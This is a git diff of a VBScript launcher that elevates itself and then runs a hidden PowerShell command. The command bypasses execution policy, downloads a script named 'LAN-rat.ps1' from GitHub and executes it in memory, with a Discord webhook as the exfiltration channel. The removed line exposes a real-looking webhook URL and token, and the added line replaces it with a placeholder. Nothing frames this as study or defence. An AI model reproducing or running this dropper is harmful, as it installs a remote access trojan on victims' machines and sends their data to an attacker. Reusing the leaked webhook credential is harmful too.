@@ -7,4 +7,4 @@ If Not WScript.Arguments.Named.Exists("elevate") Then
   WScript.Quit
 End If
 
-WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/LAN-rat.ps1 | iex", 0, True
+WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/LAN-rat.ps1 | iex", 0, True
